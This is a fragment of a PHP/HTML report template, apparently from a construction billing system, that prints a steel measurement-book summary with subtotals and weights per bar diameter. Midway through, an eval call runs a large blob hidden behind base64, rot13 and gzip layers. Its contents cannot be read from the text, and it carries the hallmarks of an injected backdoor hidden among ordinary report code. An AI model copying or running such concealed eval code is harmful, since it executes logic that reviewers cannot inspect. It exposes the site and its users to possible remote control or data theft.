				$subtotal_8 = 0;$subtotal_10 = 0;$subtotal_12 = 0;$subtotal_16 = 0;$subtotal_20 = 0;$subtotal_25 = 0;$subtotal_28 = 0;$subtotal_32 = 0;$subtotal_36 = 0;
							}
							 //$subtotal_8 = 0;
						}
						?>
							
				<tr height=''>
                    <td width='8%' class='labelcenter'><?php echo $result_summary[$x1]; ?></td>
                    <td width='4%' class='labelcenter' bgcolor="" nowrap="nowrap"><?php echo $result_summary[$x]; ?></td>
                    <td width='15%' class='labelcenter' colspan="4"><?php echo "Qty vide B/f MB-".$result_summary[$x3]."/ Page-".$result_summary[$x2];  ?></td>
					<td width='3%' class='labelcenter'><?php //echo $currentline;  ?></td>
                    <td width='7%' class='labelcenter' style="text-align:right">
										<?php 
					if($sum_sub_type == 'c'){
						echo $sum_meas_no; 
					}else{
						if($result_summary[$x7] != 0){
						echo number_format($result_summary[$x7],$result_summary[$x17],".",","); 
						}
					}
					?>

					</td>
                    <td width='7%' class='labelcenter' style="text-align:right"><?php if($result_summary[$x8] != 0){ echo number_format($result_summary[$x8],$result_summary[$x17],".",","); } ?></td>
                    <td width='7%' class='labelcenter' style="text-align:right"><?php if($result_summary[$x9] != 0){ echo number_format($result_summary[$x9],$result_summary[$x17],".",","); } ?></td>
                    <td width='7%' class='labelcenter' style="text-align:right"><?php if($result_summary[$x10] != 0){ echo number_format($result_summary[$x10],$result_summary[$x17],".",","); } ?></td>
                    <td width='7%' class='labelcenter' style="text-align:right"><?php if($result_summary[$x11] != 0){ echo number_format($result_summary[$x11],$result_summary[$x17],".",","); } ?></td>
                    <td width='7%' class='labelcenter' style="text-align:right"><?php if($result_summary[$x12] != 0){ echo number_format($result_summary[$x12],$result_summary[$x17],".",","); } ?></td>
                    <td width='7%' class='labelcenter' style="text-align:right"><?php if($result_summary[$x13] != 0){ echo number_format($result_summary[$x13],$result_summary[$x17],".",","); } ?></td>
                    <td width='7%' class='labelcenter' style="text-align:right"><?php if($result_summary[$x14] != 0){ echo number_format($result_summary[$x14],$result_summary[$x17],".",","); } ?></td>
					<td width='6%' class='labelcenter' style="text-align:right"><?php if($result_summary[$x15] != 0){ echo number_format($result_summary[$x15],$result_summary[$x17],".",","); } ?></td>
                    <!--<td width='2%' class='labelcenter'></td>-->
                </tr>

                                    <?php
					$textbox_str1 .= $result_summary[$x16]."*".$mpage."*".$mbookno."*"; //echo $textbox_str1;
					$subtotal_8	= $subtotal_8 + $result_summary[$x7];
					$subtotal_10	= $subtotal_10 + $result_summary[$x8];
					$subtotal_12	= $subtotal_12 + $result_summary[$x9];
					$subtotal_16	= $subtotal_16 + $result_summary[$x10];
					$subtotal_20	= $subtotal_20 + $result_summary[$x11];
					$subtotal_25	= $subtotal_25 + $result_summary[$x12];
					$subtotal_28	= $subtotal_28 + $result_summary[$x13];
					$subtotal_32	= $subtotal_32 + $result_summary[$x14];
					$subtotal_36	= $subtotal_36 + $result_summary[$x15];
					if($sum_sub_type == 'c'){
					$total_couplar_no = $total_couplar_no+$sum_meas_no;
					}
					$currentline++;
					if($currentline>30)
					{ 
?>
<tr height='' bgcolor="">
 <td width='' colspan="7" class='labelbold' style="text-align:right">
 <?php //if($mpage==100){ echo "C/o to Page ".(0+1)."/ Steel MB No ".$newmbookno;  } else { echo "C/o to Page ".($mpage+1)."/ Steel MB No ".$mbookno; } ?>
 C/o to page <?php if($mpage >= 100){ echo $NextMBPageList[$NextMbIncr]; ?>/Steel MB No.<?php echo $NextMBList[$NextMbIncr]; }else{ echo $mpage+1; ?>/Steel MB No.<?php echo $mbookno; } ?>
 </td>
 <td width='7%' class='labelbold' style="text-align:right">
 
 <?php 
 if($sum_sub_type == 'c')
 {
	echo $total_couplar_no;// = $total_couplar_no+$sum_meas_no;
 }
 else
 {
 	if($subtotal_8 != 0) { echo number_format($subtotal_8,$result_summary[$x17],".",","); } 
 }
 
 ?>
 
 </td>
 <td width='7%' class='labelbold' style="text-align:right"><?php if($subtotal_10 != 0) { echo number_format($subtotal_10,$result_summary[$x17],".",","); } ?></td>
 <td width='7%' class='labelbold' style="text-align:right"><?php if($subtotal_12 != 0) { echo number_format($subtotal_12,$result_summary[$x17],".",","); } ?></td>
 <td width='7%' class='labelbold' style="text-align:right"><?php if($subtotal_16 != 0) { echo number_format($subtotal_16,$result_summary[$x17],".",","); } ?></td>
 <td width='7%' class='labelbold' style="text-align:right"><?php if($subtotal_20 != 0) { echo number_format($subtotal_20,$result_summary[$x17],".",","); } ?></td>
 <td width='7%' class='labelbold' style="text-align:right"><?php if($subtotal_25 != 0) { echo number_format($subtotal_25,$result_summary[$x17],".",","); } ?></td>
 <td width='7%' class='labelbold' style="text-align:right"><?php if($subtotal_28 != 0) { echo number_format($subtotal_28,$result_summary[$x17],".",","); } ?></td>
 <td width='7%' class='labelbold' style="text-align:right"><?php if($subtotal_32 != 0) { echo number_format($subtotal_32,$result_summary[$x17],".",","); } ?></td>
 <td width='6%' class='labelbold' style="text-align:right"><?php if($subtotal_36 != 0) { echo number_format($subtotal_36,$result_summary[$x17],".",","); } ?></td>
 <!--<td width='' class='labelbold'></td>-->
</tr>

<?php					
echo check_line($currentline,$tablehead,$start_line,$title,$mpage,$mbookno,$NextMBList[$NextMbIncr],$table1,$NextMBPageList[$NextMbIncr]);
?>
<tr height='' bgcolor="">
  <td width='' colspan="7" class='labelbold' style="text-align:right">
  <?php //if($mpage==1){ echo "B/f from Page 100"; } else { echo "B/f from Page ".($mpage-1)."/ Steel MB No ".$mbookno; } ?>
  B/f from page <?php if($mpage >= 100){ echo $mpage; ?>/Steel MB No.<?php echo $mbookno; }else{ echo $mpage; ?>/Steel MB No.<?php echo $mbookno; } ?>
  </td>
  <td width='7%' class='labelbold' style="text-align:right">
  <?php 
 if($sum_sub_type == 'c')
 {
	echo $total_couplar_no;// = $total_couplar_no+$sum_meas_no;
 }
 else
 {
  	if($subtotal_8 != 0) { echo number_format($subtotal_8,$result_summary[$x17],".",","); } 
 }
  ?>
  </td>
  <td width='7%' class='labelbold' style="text-align:right"><?php if($subtotal_10 != 0) { echo number_format($subtotal_10,$result_summary[$x17],".",","); } ?></td>
  <td width='7%' class='labelbold' style="text-align:right"><?php if($subtotal_12 != 0) { echo number_format($subtotal_12,$result_summary[$x17],".",","); } ?></td>
  <td width='7%' class='labelbold' style="text-align:right"><?php if($subtotal_16 != 0) { echo number_format($subtotal_16,$result_summary[$x17],".",","); } ?></td>
  <td width='7%' class='labelbold' style="text-align:right"><?php if($subtotal_20 != 0) { echo number_format($subtotal_20,$result_summary[$x17],".",","); } ?></td>
  <td width='7%' class='labelbold' style="text-align:right"><?php if($subtotal_25 != 0) { echo number_format($subtotal_25,$result_summary[$x17],".",","); } ?></td>
  <td width='7%' class='labelbold' style="text-align:right"><?php if($subtotal_28 != 0) { echo number_format($subtotal_28,$result_summary[$x17],".",","); } ?></td>
  <td width='7%' class='labelbold' style="text-align:right"><?php if($subtotal_32 != 0) { echo number_format($subtotal_32,$result_summary[$x17],".",","); } ?></td>
  <td width='6%' class='labelbold' style="text-align:right"><?php if($subtotal_36 != 0) { echo number_format($subtotal_36,$result_summary[$x17],".",","); } ?></td>
  <!--<td width='' class='labelbold'>&nbsp;</td>-->
</tr>
<?php 	
 		$currentline = 0;$currentline = $start_line + 13;$mpage++;
		/////////// THIS IS FOR MULTIPLE MB SELECT CHANGE ON JUNE 2019 //////////
		if($mpage > 100){ if($NextMBFlag == 0){ $NextMBOption = $NextMBOption + 1; $mpage = 1; }else{ $UsedMBArr[$mbookno][1] = $mpage-1; $UsedMBArr[$mbookno][2] = 0; $mbookno = $NextMBList[$NextMbIncr]; $mpage = $NextMBPageList[$NextMbIncr]; $NextMbIncr++; } }
					}
							
					$pre_subdivname = $result_summary[$x];
					$pre_date = $result_summary[$x1];
					$pre_page = $result_summary[$x2]; 
					$pre_mbookno = $result_summary[$x3];
					$pre_totals = $result_summary[$x4];
					$pre_subdivid = $result_summary[$x5];
					$pre_divid = $result_summary[$x6];
					$pre_tot8 = $result_summary[$x7];
					$pre_tot10 = $result_summary[$x8];
					$pre_tot12 = $result_summary[$x9];
					$pre_tot16 = $result_summary[$x10];
					$pre_tot20 = $result_summary[$x11];
					$pre_tot25 = $result_summary[$x12];
					$pre_tot28 = $result_summary[$x13];
					$pre_tot32 = $result_summary[$x14];
					$pre_tot36 = $result_summary[$x15];
					$pre_textboxid = $result_summary[$x16];
					$pre_decimal = $result_summary[$x17];
					$prev_sum_meas_no = $result_summary[$x18];
					$prev_sum_sub_type = $result_summary[$x19];
					//$textbox_str1 .= $result_summary[$x16]."*".$result_summary[$x2]."*".$result_summary[$x3]."*"; echo $textbox_str1;
//echo $result_summary[$x16]."<br/>";
                }
				if($currentline>30){ 
					echo check_line($currentline,$tablehead,$start_line,$title,$mpage,$mbookno,$NextMBList[$NextMbIncr],$table1,$NextMBPageList[$NextMbIncr]); $currentline = 0;$currentline = $start_line + 13;$mpage++;
					/////////// THIS IS FOR MULTIPLE MB SELECT CHANGE ON JUNE 2019 //////////
					if($mpage > 100){ if($NextMBFlag == 0){ $NextMBOption = $NextMBOption + 1; $mpage = 1; }else{ $UsedMBArr[$mbookno][1] = $mpage-1; $UsedMBArr[$mbookno][2] = 0; $mbookno = $NextMBList[$NextMbIncr]; $mpage = $NextMBPageList[$NextMbIncr]; $NextMbIncr++; } }
				}
				if($prev_sum_sub_type == 'c')
				{
				?>
				<tr height='' bgcolor="">
                    <td width='' class='labelcenter'></td>
                    <td width='' class='labelcenter'></td>
                    <td width='' colspan="4" align="right" class='label labelbold'>Total</td>
                    <td width='' class='labelcenter labelheadblue'></td>
                    <td width='' class='labelcenter labelbold' style="text-align:right"><?php echo $total_couplar_no; ?></td>
                    <td width='' class='labelcenter labelbold' style="text-align:right">each</td>
                    <td width='' class='labelcenter labelbold' style="text-align:right" colspan="7"><?php echo getcompositepage($sheetid,$pre_subdivid,$rbn,$zone_id); ?></td>
                    <!--<td width='' class='labelcenter'></td>-->
                </tr>
				<!--<tr height='' bgcolor="">
                   <td width='' class='labelcenter'></td>
                   <td width='' class='labelcenter'><?php //echo "C/o to P".$mpage." MB".$mbookno."";  ?></td>
                   <td width='' colspan="3" class='labelcenter labelheadblue'>Total</td>
                   <td width='' colspan="10" class='labelcenter labelheadblue'><?php echo $total_couplar_no." each"; ?></td>
                </tr>-->
				<?php	
				$totalweight_MT = $total_couplar_no;
				}
				else
				{
				?>
				<tr height=''>
                    <td width='' class='labelcenter'></td>
                    <td width='' class='labelcenter'></td>
                    <td width='' colspan="4" class='labelcenter'>Sub Total</td>
                    <td width='' class='labelcenter'></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($subtotal_8 != 0) { echo number_format($subtotal_8,$pre_decimal,".",","); } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($subtotal_10 != 0) { echo number_format($subtotal_10,$pre_decimal,".",","); } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($subtotal_12 != 0) { echo number_format($subtotal_12,$pre_decimal,".",","); } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($subtotal_16 != 0) { echo number_format($subtotal_16,$pre_decimal,".",","); } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($subtotal_20 != 0) { echo number_format($subtotal_20,$pre_decimal,".",","); } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($subtotal_25 != 0) { echo number_format($subtotal_25,$pre_decimal,".",","); } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($subtotal_28 != 0) { echo number_format($subtotal_28,$pre_decimal,".",","); } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($subtotal_32 != 0) { echo number_format($subtotal_32,$pre_decimal,".",","); } ?></td>
					<td width='' class='labelcenter' style="text-align:right"><?php if($subtotal_36 != 0) { echo number_format($subtotal_36,$pre_decimal,".",","); } ?></td>
                    <!--<td width='' class='labelcenter'></td>-->
                </tr>
				<!--<tr>
					<td width='' class='labelcenter'></td>
                    <td width='' class='labelcenter'></td>
                    <td width='' colspan="7" align="right" class='label labelheadblue'><?php echo getcompositepage($sheetid,$pre_subdivid,$rbn,$zone_id); ?></td>
                    <td width='' class='labelcenter labelheadblue' style="text-align:right"></td>
                    <td width='' class='labelcenter labelheadblue' style="text-align:right"></td>
                    <td width='' class='labelcenter labelheadblue' style="text-align:right"></td>
                    <td width='' class='labelcenter labelheadblue' style="text-align:right"></td>
                    <td width='' class='labelcenter labelheadblue' style="text-align:right"></td>
					<td width='' class='labelcenter labelheadblue' style="text-align:right"></td>
                    <td width='' class='labelcenter'></td>
				</tr>-->
				<tr height='' bgcolor="">
                    <td width='' class='labelcenter'></td>
                    <td width='' class='labelcenter'></td>
                    <td width='' colspan="4" class='labelcenter'>Unit Weight</td>
                    <td width='' class='labelcenter'></td>
                    <td width='' class='labelcenter' style="text-align:right">0.395</td>
                    <td width='' class='labelcenter' style="text-align:right">0.617</td>
                    <td width='' class='labelcenter' style="text-align:right">0.888</td>
                    <td width='' class='labelcenter' style="text-align:right">1.578</td>
                    <td width='' class='labelcenter' style="text-align:right">2.466</td>
                    <td width='' class='labelcenter' style="text-align:right">3.853</td>
                    <td width='' class='labelcenter' style="text-align:right">4.834</td>
                    <td width='' class='labelcenter' style="text-align:right">6.313</td>
					<td width='' class='labelcenter' style="text-align:right">7.990</td>
                    <!--<td width='' class='labelcenter'></td>-->
                </tr>	
				<?php
				eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));

				
				
				//echo $summary_str;
				
				//echo count($summary); 
				//$textbox_str2 .= $pre_textboxid."*".$mpage."*".$pre_mbookno."*"; echo $textbox_str2;
				//$textbox_str = $textbox_str1.$textbox_str2; //echo $textbox_str;
				?>
				<tr height='' bgcolor="">
                    <td width='' class='labelcenter'></td>
                    <td width='' class='labelcenter'></td>
                    <td width='' colspan="4" class='labelcenter'>Total Weight</td>
                    <td width='' class='labelcenter'></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($total_8 != 0) { echo number_format($total_8,$pre_decimal,".",","); } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($total_10 != 0) { echo number_format($total_10,$pre_decimal,".",","); } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($total_12 != 0) { echo number_format($total_12,$pre_decimal,".",","); } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($total_16 != 0) { echo number_format($total_16,$pre_decimal,".",","); } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($total_20 != 0) { echo number_format($total_20,$pre_decimal,".",","); } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($total_25 != 0) { echo number_format($total_25,$pre_decimal,".",","); } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($total_28 != 0) { echo number_format($total_28,$pre_decimal,".",","); } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($total_32 != 0) { echo number_format($total_32,$pre_decimal,".",","); } ?></td>
					<td width='' class='labelcenter' style="text-align:right"><?php if($total_36 != 0) { echo number_format($total_36,$pre_decimal,".",","); } ?></td>
                    <!--<td width='' class='labelcenter'></td>-->
                </tr>
				<tr height='' bgcolor="">
                   <td width='' class='labelcenter'></td>
                   <td width='' class='labelcenter'></td>
                   <td width='' colspan="4" class='labelcenter'>Total in kgs</td>
                   <td width='' colspan="5" class='labelcenter'><?php echo number_format($totalweight_KGS,$pre_decimal,".",",")." kgs"; ?></td>
                   <td width='' colspan="5" class='labelcenter'></td>
				   
                </tr>
				<tr height=''>
                   <td width='' class='labelcenter'></td>
                   <td width='' class='labelcenter'></td>
                   <td width='' colspan="4" align="right" class='labelbold'>Total in MT</td>
                   <td width='' colspan="5" align="center" class='labelbold'><?php echo number_format($totalweight_MT,$pre_decimal,".",",")." MT"; ?></td>
                   <td width='' colspan="5" class='labelbold' style='text-align:right'><?php echo getcompositepage($sheetid,$pre_subdivid,$rbn,$zone_id); ?></td>
				   
                </tr>
				<?php } ?>
<!--<tr style="border-style:none;">
<td style="border-style:none;" colspan="8" align="right" class="label"><?php //echo "<br/><br/>"; echo "Page ".$mpage."&nbsp;&nbsp;"; ?></td>
<td style="border-style:none;" colspan="7" align="center" class="label"><?php //echo "<br/><br/>"; //echo $staffname." - ".$designation; ?></td>
</tr>-->
<tr style="border-style:none;">
<td style="border-style:none;" colspan="9" align="right" class="label"><?php /*echo "<br/><br/>";*/ echo "Page ".$mpage."&nbsp;&nbsp;"; ?></td>
<td style="border-style:none;" colspan="7" align="center" class="label"><?php /*echo "<br/><br/>";*/ //echo "Prepared By"; ?></td>
</tr>
				<?php //echo "COUNT = ".$count;
				$summary_str2 .= $pre_subdivname.",".$pre_subdivid.",".$totalweight_MT.",".$pre_divid.",".$pre_mbookno.",".$mpage;
				$summary_str = $summary_str1.$summary_str2;
				$summary = explode(",",$summary_str);
				if($count>0)
				{
					for($y=0;$y<count($summary);$y+=6)
					{
						$y1 = $y; $y2 = $y+1; $y3 = $y+2; $y4 = $y+3; $y5 = $y+4; $y6 = $y+5;
						$pre_page = $summary[$y6];
						//MeasurementSteelinsert($fromdate,$todate,$sheetid,$summary[$y5],$pre_page,$summary[$y3],$rbn,$userid,$summary[$y2],$summary[$y4],$staffid);
					}
				}
				else
				{
				$pre_page = 1;
					//MeasurementSteelinsert($fromdate,$todate,$sheetid,$pre_mbookno,$mpage,$totalweight_MT,$rbn,$userid,$pre_subdivid,$pre_divid,$staffid);
				}
               }
               ?>
			   </table>
			   <input type="hidden" name="txt_boxid_str" id="txt_boxid_str" value="<?php echo rtrim($textbox_str1,"*"); ?>"  />
			  <!-- <div class="divFooter">UNCLASSIFIED</div>-->
			 <!--<hr />-->
           <!-- <table align="center" style="border:none;" class="printbutton">
                <tr style="border:none">
                   <td align="center" colspan="15" style="border:none;"><br/><input type="submit" name="back" value=" Back "/></td>
                </tr>
            </table>-->
			<div align="center" class="btn_outside_sect printbutton">
				<div class="btn_inside_sect"><input type="submit" name="back" value=" Back " /> </div>
				<div class="btn_inside_sect"><input type="button" class="backbutton" name="print" value=" Print " onclick="printBook();" /></div>
			</div>
 </form>
    </body>
	<script type="text/javascript">
   $(function(){ 
   var getstr = document.getElementById("txt_boxid_str").value;
   var splitval = getstr.split("*"); //alert(splitval.length);
   var x=0;
   for(x=0;x<splitval.length;x+=3)
   {
   		document.getElementById("txt_pageid"+splitval[x]).value = "C/o to page "+splitval[x+1]+" /Steel MB No. "+"<?php echo $mbookno; ?>"; 
   }
   });
   </script>
</html>